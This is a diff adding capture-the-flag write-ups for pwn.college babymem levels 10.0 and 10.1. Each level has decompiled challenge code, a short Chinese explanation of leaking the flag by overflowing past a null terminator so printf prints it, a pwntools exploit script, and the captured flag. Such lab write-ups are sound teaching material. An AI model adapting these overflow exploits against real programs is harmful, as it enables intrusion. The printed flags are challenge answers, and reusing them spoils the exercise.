@@ -3373,3 +3373,268 @@ while True:
 #### Flag
 
 Flag: `pwn.college{QfzSsyMdYf7_dP64EnXQ8DrrgQ1.0lNwMDL5cTNxgzW}`
+
+### Level 10.0
+
+#### Information
+
+- Category: Pwn
+
+#### Description
+
+> Overflow a buffer and leak the flag. Be warned, this requires careful and clever payload construction!
+
+#### Write-up
+
+```c {10-12, 26-27} ins={47-48} del={80} collapse={1-6, 16-22, 31-43, 52-76}
+__int64 __fastcall challenge(int a1, __int64 a2, __int64 a3)
+{
+  int v3; // eax
+  int *v4; // rax
+  char *v5; // rax
+  _QWORD v7[3]; // [rsp+0h] [rbp-170h] BYREF
+  int v8; // [rsp+1Ch] [rbp-154h]
+  int v9; // [rsp+24h] [rbp-14Ch]
+  size_t nbytes; // [rsp+28h] [rbp-148h] BYREF
+  void *v11; // [rsp+30h] [rbp-140h]
+  void *buf; // [rsp+38h] [rbp-138h]
+  _BYTE v13[288]; // [rsp+40h] [rbp-130h] BYREF
+  int v14; // [rsp+160h] [rbp-10h]
+  char v15; // [rsp+164h] [rbp-Ch]
+  unsigned __int64 v16; // [rsp+168h] [rbp-8h]
+  __int64 savedregs; // [rsp+170h] [rbp+0h] BYREF
+  _UNKNOWN *retaddr; // [rsp+178h] [rbp+8h] BYREF
+
+  v8 = a1;
+  v7[2] = a2;
+  v7[1] = a3;
+  v16 = __readfsqword(0x28u);
+  memset(v13, 0, sizeof(v13));
+  v14 = 0;
+  v15 = 0;
+  v11 = v13;
+  buf = &v13[37];
+  nbytes = 0LL;
+  puts("The challenge() function has just been launched!");
+  sp_ = (__int64)v7;
+  bp_ = (__int64)&savedregs;
+  sz_ = ((unsigned __int64)((char *)&savedregs - (char *)v7) >> 3) + 2;
+  rp_ = (__int64)&retaddr;
+  puts("Before we do anything, let's take a look at challenge()'s stack frame:");
+  DUMP_STACK(sp_, sz_);
+  printf("Our stack pointer points to %p, and our base pointer points to %p.\n", (const void *)sp_, (const void *)bp_);
+  printf("This means that we have (decimal) %d 8-byte words in our stack frame,\n", sz_);
+  puts("including the saved base pointer and the saved return address, for a");
+  printf("total of %d bytes.\n", 8 * sz_);
+  printf("The input buffer begins at %p, partway through the stack frame,\n", v11);
+  puts("(\"above\" it in the stack are other local variables used by the function).");
+  puts("Your input will be read into this buffer.");
+  printf("The buffer is %d bytes long, but the program will let you provide an arbitrarily\n", 37);
+  puts("large input length, and thus overflow the buffer.\n");
+  puts("In this level, the flag will be loaded into memory.");
+  puts("However, at no point will this program actually print the buffer storing the flag.");
+  v3 = open("/flag", 0);
+  read(v3, buf, 0x100uLL);
+  cp_ = bp_;
+  cv_ = __readfsqword(0x28u);
+  while ( *(_QWORD *)cp_ != cv_ )
+    cp_ -= 8LL;
+  printf("Payload size: ");
+  __isoc99_scanf("%lu", &nbytes);
+  printf("You have chosen to send %lu bytes of input!\n", nbytes);
+  printf("This will allow you to write from %p (the start of the input buffer)\n", v11);
+  printf(
+    "right up to (but not including) %p (which is %d bytes beyond the end of the buffer).\n",
+    (char *)v11 + nbytes,
+    nbytes - 37);
+  printf("Send your payload (up to %lu bytes)!\n", nbytes);
+  v9 = read(0, v11, nbytes);
+  if ( v9 < 0 )
+  {
+    v4 = __errno_location();
+    v5 = strerror(*v4);
+    printf("ERROR: Failed to read input -- %s!\n", v5);
+    exit(1);
+  }
+  printf("You sent %d bytes!\n", v9);
+  puts("The program's memory status:");
+  printf("- the input buffer starts at %p\n", v11);
+  printf("- the saved frame pointer (of main) is at %p\n", (const void *)bp_);
+  printf("- the saved return address (previously to main) is at %p\n", (const void *)rp_);
+  printf("- the saved return address is now pointing to %p.\n", *(const void **)rp_);
+  printf("- the canary is stored at %p.\n", (const void *)cp_);
+  printf("- the canary value is now %p.\n", *(const void **)cp_);
+  printf("- the address of the flag is %p.\n", buf);
+  putchar(10);
+  printf("You said: %s\n", (const char *)v11);
+  puts("Goodbye!");
+  return 0LL;
+}
+```
+
+```plaintext wrap=false showLineNumbers=false
+4755 .rwsr-xr-x 18k root root 12 Dec 21:43 babymem-level-10-0*
+0400 .r--------  57 root root 12 Dec 22:13 /flag
+```
+
+通过调试我们发现，`read` 并不会从 `/flag` 中读到数据。但由于这是个 `SUID` 程序，运行的时候会以这个程序的所有者的身份运行，而所有者是 `root`，那么理应我们可以读取 `/flag` 才对。这里的问题其实在于内核的保护策略：调试 `SUID` 程序的时候，Linux 内核会移除 `SUID` 位，使用当前用户权限调试，以此防止攻击者通过调试器以特权身份执行恶意代码。我们用 `sudo` 以 `root` 用户的身份来调试就好了。
+
+注意到程序最后使用 `printf` 将整个 `buf` 的内容输出。而我们的 `flag` 在此之前就已经被保存到 `buf` 中了。所以这里考察的是 `printf` 在遇到 `\x00` 后认为字符串结束而中断输出。
+
+所以我们只要使用垃圾值填充到 `flag` 保存的位置就好了。
+
+~为什么那么简单……这可是至高的 Level 10！！！~
+
+#### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import ELF, context, gdb, log, pause, process, remote
+
+context(os="linux", arch="amd64", log_level="debug", terminal="kitty")
+
+FILE = "./babymem-level-10-0"
+HOST = "pwn.college"
+PORT = 1337
+
+gdbscript = """
+b *challenge+507
+c
+"""
+
+
+def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
+    if local:
+        elf = ELF(FILE)
+        context.binary = elf
+
+        if debug:
+            return gdb.debug(
+                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
+            )
+        else:
+            return process([elf.path] + (argv or []), env=envp)
+    else:
+        return remote(HOST, PORT)
+
+
+padding = b"".ljust(0x25, b"A")
+
+
+def send_payload(target, payload):
+    try:
+        payload_size = f"{len(payload)}".encode()
+        target.recvuntil(b"Payload size: ")
+        target.sendline(payload_size)
+        target.recvuntil(b"Send your payload")
+        target.send(payload)
+
+        response = target.recvall()
+
+        return b"pwn.college{" in response
+    except Exception as e:
+        log.exception(f"An error occurred: {e}")
+
+
+try:
+    target = launch(debug=False)
+
+    payload = padding
+
+    if send_payload(target, payload):
+        log.success("Success! Exiting...")
+
+        pause()
+        exit()
+except Exception as e:
+    log.exception(f"An error occurred in main loop: {e}")
+```
+
+#### Flag
+
+Flag: `pwn.college{cHV80jBzHGyTr_qaE0HdorP-81y.01NwMDL5cTNxgzW}`
+
+### Level 10.1
+
+#### Information
+
+- Category: Pwn
+
+#### Description
+
+> Overflow a buffer and leak the flag. Be warned, this requires careful and clever payload construction!
+
+#### Write-up
+
+试问这和上一题有何区别……
+
+#### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import ELF, context, gdb, log, pause, process, remote
+
+context(os="linux", arch="amd64", log_level="debug", terminal="kitty")
+
+FILE = "./babymem-level-10-1"
+HOST = "pwn.college"
+PORT = 1337
+
+gdbscript = """
+b *challenge+166
+c
+"""
+
+
+def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
+    if local:
+        elf = ELF(FILE)
+        context.binary = elf
+
+        if debug:
+            return gdb.debug(
+                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
+            )
+        else:
+            return process([elf.path] + (argv or []), env=envp)
+    else:
+        return remote(HOST, PORT)
+
+
+padding = b"".ljust(0x51, b"A")
+
+
+def send_payload(target, payload):
+    try:
+        payload_size = f"{len(payload)}".encode()
+        target.recvuntil(b"Payload size: ")
+        target.sendline(payload_size)
+        target.recvuntil(b"Send your payload")
+        target.send(payload)
+
+        response = target.recvall()
+
+        return b"pwn.college{" in response
+    except Exception as e:
+        log.exception(f"An error occurred: {e}")
+
+
+try:
+    target = launch(debug=False)
+
+    payload = padding
+
+    if send_payload(target, payload):
+        log.success("Success! Exiting...")
+
+        pause()
+        exit()
+except Exception as e:
+    log.exception(f"An error occurred in main loop: {e}")
+```
+
+#### Flag
+
+Flag: `pwn.college{4n50Ii5yzf-WULWGzVOqmN3vTgp.0FOwMDL5cTNxgzW}`
